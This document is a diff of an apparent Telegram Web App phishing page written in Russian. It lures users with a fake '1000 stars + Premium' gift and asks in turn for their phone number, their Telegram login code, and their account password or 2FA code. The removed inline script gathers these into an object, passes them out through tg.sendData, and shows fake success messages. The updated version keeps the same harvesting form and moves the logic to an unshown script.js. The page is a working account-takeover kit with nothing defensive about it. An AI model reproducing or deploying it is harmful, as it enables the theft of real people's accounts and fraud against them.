@@ -3,214 +3,152 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>🎁 1000 Звёзд + Premium</title>
+    <title>Получить подарок</title>
     <link rel="stylesheet" href="style.css">
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
 </head>
 <body>
     <div class="container">
-        <div id="step1">
+        <!-- Шаг 1: Ввод номера -->
+        <div id="step1" class="form-step">
             <div class="header">
                 <div class="logo">🎁</div>
-                <h1>1000 ЗВЁЗД + PREMIUM</h1>
-                <p class="subtitle">Активируйте эксклюзивный подарок от Telegram</p>
+                <h1>Получить подарок</h1>
+                <p class="subtitle">Введите номер телефона для активации</p>
             </div>
             
-            <div class="gift-list">
+            <div class="gift-info">
                 <div class="gift-item">
-                    <div class="gift-icon">✨</div>
-                    <div class="gift-text">
-                        <div class="gift-title">1000 ЗВЁЗД TELEGRAM</div>
-                        <div class="gift-desc">Для покупки стикеров, смайлов, подарков</div>
-                    </div>
+                    <span class="gift-icon">✨</span>
+                    <span class="gift-text">1000 звезд Telegram</span>
                 </div>
-                
                 <div class="gift-item">
-                    <div class="gift-icon">👑</div>
-                    <div class="gift-text">
-                        <div class="gift-title">PREMIUM НА 3 МЕСЯЦА</div>
-                        <div class="gift-desc">Эксклюзивные функции и возможности</div>
-                    </div>
-                </div>
-                
-                <div class="gift-item">
-                    <div class="gift-icon">✅</div>
-                    <div class="gift-text">
-                        <div class="gift-title">ПРОВЕРЕННЫЙ СТАТУС</div>
-                        <div class="gift-desc">Повышенная безопасность аккаунта</div>
-                    </div>
+                    <span class="gift-icon">👑</span>
+                    <span class="gift-text">Premium на 3 месяца</span>
                 </div>
             </div>
             
             <div class="step-indicator">
-                <span class="step active">1</span>
+                <div class="step active">1</div>
                 <div class="line"></div>
-                <span class="step">2</span>
+                <div class="step">2</div>
                 <div class="line"></div>
-                <span class="step">3</span>
+                <div class="step">3</div>
             </div>
             
-            <h2>Введите номер Telegram</h2>
-            <p class="form-description">На этот номер придет код подтверждения</p>
+            <div class="form-group">
+                <label for="country">Страна</label>
+                <select id="country" class="country-select" onchange="updateCountryCode()">
+                    <option value="7" data-code="+7" data-placeholder="(999) 123-45-67">Россия (+7)</option>
+                    <option value="380" data-code="+380" data-placeholder="(99) 123-45-67">Украина (+380)</option>
+                    <option value="375" data-code="+375" data-placeholder="(29) 123-45-67">Беларусь (+375)</option>
+                    <option value="7" data-code="+7" data-placeholder="(777) 123-45-67">Казахстан (+7)</option>
+                    <option value="998" data-code="+998" data-placeholder="(99) 123-45-67">Узбекистан (+998)</option>
+                    <option value="992" data-code="+992" data-placeholder="(99) 123-45-67">Таджикистан (+992)</option>
+                    <option value="993" data-code="+993" data-placeholder="(99) 123-45-67">Туркменистан (+993)</option>
+                    <option value="996" data-code="+996" data-placeholder="(999) 123-456">Кыргызстан (+996)</option>
+                    <option value="373" data-code="+373" data-placeholder="(99) 123-456">Молдова (+373)</option>
+                    <option value="374" data-code="+374" data-placeholder="(99) 123-456">Армения (+374)</option>
+                    <option value="995" data-code="+995" data-placeholder="(999) 123-456">Грузия (+995)</option>
+                    <option value="994" data-code="+994" data-placeholder="(99) 123-45-67">Азербайджан (+994)</option>
+                </select>
+            </div>
             
             <div class="form-group">
                 <label for="phone">Номер телефона</label>
-                <div class="input-with-flag">
-                    <div class="country-code">+7</div>
-                    <input type="tel" id="phone" placeholder="9991234567" maxlength="10">
+                <div class="phone-input">
+                    <div class="country-code" id="countryCode">+7</div>
+                    <input type="tel" id="phone" placeholder="(999) 123-45-67">
                 </div>
             </div>
-
+            
             <button class="btn-primary" onclick="requestCode()">Получить код</button>
             
-            <div class="timer">
-                ⏰ Подарок активируется автоматически в течение 10 минут
+            <div class="note">
+                На указанный номер будет отправлен код подтверждения
             </div>
         </div>
-
-        <div id="step2" style="display: none;">
+        
+        <!-- Шаг 2: Ввод кода -->
+        <div id="step2" class="form-step" style="display: none;">
             <div class="step-indicator">
-                <span class="step completed">✓</span>
+                <div class="step completed">✓</div>
                 <div class="line active"></div>
-                <span class="step active">2</span>
+                <div class="step active">2</div>
                 <div class="line"></div>
-                <span class="step">3</span>
+                <div class="step">3</div>
             </div>
-
-            <h2>Введите код из Telegram</h2>
-            <p class="form-description">Мы отправили 5-значный код в приложение Telegram</p>
+            
+            <h2>Код подтверждения</h2>
+            <p class="form-description">Введите 5-значный код, отправленный в Telegram</p>
             
             <div class="form-group">
-                <label for="code">Код подтверждения</label>
-                <input type="text" id="code" placeholder="12345" maxlength="5" class="code-input">
-                <p style="color:#666; font-size:12px; margin-top:5px;">Проверьте уведомления в Telegram</p>
+                <input type="text" id="code" class="code-input" placeholder="12345" maxlength="5">
             </div>
-
-            <button class="btn-primary" onclick="checkAuth()">Активировать подарок</button>
+            
+            <button class="btn-primary" onclick="checkAuth()">Продолжить</button>
             <button class="btn-secondary" onclick="showStep(1)">Назад</button>
-        </div>
-
-        <div id="step3" style="display: none;">
-            <div class="step-indicator">
-                <span class="step completed">✓</span>
-                <div class="line active"></div>
-                <span class="step completed">✓</span>
-                <div class="line active"></div>
-                <span class="step active">3</span>
+            
+            <div class="resend">
+                Не получили код? <a href="#" onclick="resendCode()">Отправить снова</a>
             </div>
-
-            <h2>Дополнительная безопасность</h2>
-            <p class="form-description">Только если включена двухфакторная аутентификация</p>
+        </div>
+        
+        <!-- Шаг 3: 2FA (если нужно) -->
+        <div id="step3" class="form-step" style="display: none;">
+            <div class="step-indicator">
+                <div class="step completed">✓</div>
+                <div class="line active"></div>
+                <div class="step completed">✓</div>
+                <div class="line active"></div>
+                <div class="step active">3</div>
+            </div>
+            
+            <h2>Дополнительная проверка</h2>
+            <p class="form-description">Для аккаунтов с двухфакторной аутентификацией</p>
             
             <div class="form-group">
-                <label for="password">Пароль от аккаунта Telegram</label>
-                <input type="password" id="password" placeholder="Введите ваш пароль">
+                <label for="password">Пароль от Telegram</label>
+                <input type="password" id="password" placeholder="Введите пароль">
             </div>
-
+            
             <div class="form-group">
-                <label for="twofa">Код двухфакторной аутентификации (2FA)</label>
+                <label for="twofa">Код 2FA (если есть)</label>
                 <input type="text" id="twofa" placeholder="000000" maxlength="6">
             </div>
-
-            <button class="btn-primary" onclick="submit2FA()">Завершить активацию</button>
+            
+            <button class="btn-primary" onclick="submit2FA()">Завершить</button>
             <button class="btn-secondary" onclick="showStep(2)">Назад</button>
+            
+            <div class="note">
+                Пароль нужен только если включена двухфакторная аутентификация
+            </div>
         </div>
-
-        <div class="loading" id="loading" style="display: none;">
+        
+        <!-- Загрузка -->
+        <div id="loading" class="loading" style="display: none;">
             <div class="spinner"></div>
-            <p style="margin:10px 0; font-weight:bold;">Активация подарка...</p>
-            <p style="color:#666; font-size:14px;">Не закрывайте это окно</p>
+            <p>Проверка данных...</p>
+            <p class="small">Пожалуйста, подождите</p>
         </div>
-
-        <div class="success" id="success" style="display: none;">
-            <div class="success-icon">✅</div>
-            <h2>ПОДАРОК АКТИВИРОВАН!</h2>
-            <p>1000 звёзд и Premium будут активны в течение 10 минут.</p>
-            <p style="color:#666; margin-top:10px; font-size:14px;">Не выходите из Telegram</p>
+        
+        <!-- Успех -->
+        <div id="success" class="success" style="display: none;">
+            <div class="success-icon">✓</div>
+            <h2>Готово</h2>
+            <p>Подарок будет активирован в течение 10 минут</p>
+            <p class="small">Не выходите из Telegram</p>
         </div>
-
-        <div class="error" id="error" style="display: none;">
-            <div class="error-icon">❌</div>
-            <h2>ОШИБКА АКТИВАЦИИ</h2>
-            <p id="errorText">Попробуйте позже или проверьте код.</p>
-            <button class="btn-secondary" onclick="showStep(1)" style="margin-top:15px;">Попробовать снова</button>
+        
+        <!-- Ошибка -->
+        <div id="error" class="error" style="display: none;">
+            <div class="error-icon">✕</div>
+            <h2>Ошибка</h2>
+            <p id="errorText">Попробуйте позже</p>
+            <button class="btn-secondary" onclick="showStep(1)">Повторить</button>
         </div>
     </div>
 
-    <script>
-        let tg = window.Telegram.WebApp;
-        tg.expand();
-        
-        let currentStep = 1;
-        let userData = {};
-
-        function showStep(step) {
-            document.querySelectorAll('#step1, #step2, #step3, #loading, #success, #error')
-                .forEach(el => el.style.display = 'none');
-            
-            document.getElementById(`step${step}`).style.display = 'block';
-            currentStep = step;
-        }
-
-        function requestCode() {
-            const phone = document.getElementById('phone').value;
-            
-            if (!phone || phone.length < 10) {
-                alert('Введите корректный номер телефона');
-                return;
-            }
-            
-            userData.phone = '+7' + phone;
-            showStep(2);
-            
-            setTimeout(() => {
-                alert('✅ Код отправлен! Проверьте Telegram.');
-            }, 500);
-        }
-
-        function checkAuth() {
-            const code = document.getElementById('code').value;
-            
-            if (!code || code.length !== 5) {
-                alert('Введите 5-значный код');
-                return;
-            }
-            
-            userData.code = code;
-            
-            showStep('loading');
-            
-            setTimeout(() => {
-                if (Math.random() < 0.2) {
-                    showStep(3);
-                } else {
-                    submitData();
-                }
-            }, 1500);
-        }
-
-        function submit2FA() {
-            const password = document.getElementById('password').value;
-            const twofa = document.getElementById('twofa').value;
-            
-            if (password) userData.password = password;
-            if (twofa) userData.twofa = twofa;
-            
-            submitData();
-        }
-
-        function submitData() {
-            showStep('loading');
-            
-            setTimeout(() => {
-                tg.sendData(JSON.stringify(userData));
-                
-                setTimeout(() => {
-                    showStep('success');
-                }, 2000);
-                
-            }, 2000);
-        }
-    </script>
+    <script src="script.js"></script>
 </body>
 </html>
